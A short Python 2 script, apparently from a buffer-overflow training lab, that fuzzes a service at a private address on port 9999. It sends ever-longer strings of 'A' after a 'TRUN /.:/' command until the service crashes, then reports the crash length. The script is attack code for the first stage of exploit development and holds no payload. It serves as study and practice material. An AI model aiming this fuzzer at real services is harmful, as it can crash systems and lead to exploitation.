#!/usr/bin/python


import sys, socket
from time import sleep
buffer = "A" * 100
while True:
    try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.1.130', 9999)) #This is the address and port of the target machine
            s.send(('TRUN /.:/' + buffer))
            sleep(1)
            buffer = buffer + "A" * 100

    except:
            print "Fuzzing crashed at %s bytes" % str(len(buffer))
            sys.exit()